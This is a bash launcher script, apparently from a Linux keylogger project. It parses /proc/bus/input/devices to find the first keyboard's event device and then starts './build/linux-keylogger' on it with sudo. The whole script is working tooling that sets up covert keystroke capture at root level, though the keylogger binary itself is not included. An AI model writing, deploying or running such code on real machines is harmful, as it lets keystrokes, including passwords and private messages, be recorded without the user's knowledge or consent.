#!/bin/bash


keyboard=$(cat /proc/bus/input/devices | grep -A2 -i 'keyboard')

if [[ -z "$keyboard" ]]; then
    echo "No keyboard found."
    exit 1
fi

# cut the output to get only the name of the Keyboard
keyboard_name=$(echo "$keyboard" | grep -i 'Name' | cut -d '=' -f 2)
# if many keyboard, take the first one
keyboard_name=$(echo "$keyboard_name" | head -n 1)
echo "$keyboard_name"

device=$(grep -A 5 "$keyboard_name" /proc/bus/input/devices)
echo "$device"
# cut the output to get the device path (event number is at the end
listOfHandlers=$(echo "$device" | grep -i 'H: Handlers' | cut -d ':' -f 2 | cut -d '=' -f 2 | cut -d '-' -f 2)

echo "$listOfHandlers"

# search for eventX in the listOfHandlers
event=$(echo "$listOfHandlers" | grep -o 'event[0-9]*' | head -n 1)

if [[ -z "$event" ]]; then
    echo "No event found for the keyboard."
    exit 1
fi

# exec the keylogger
echo "Starting keylogger on $event"
sudo ./build/linux-keylogger "/dev/input/$event"
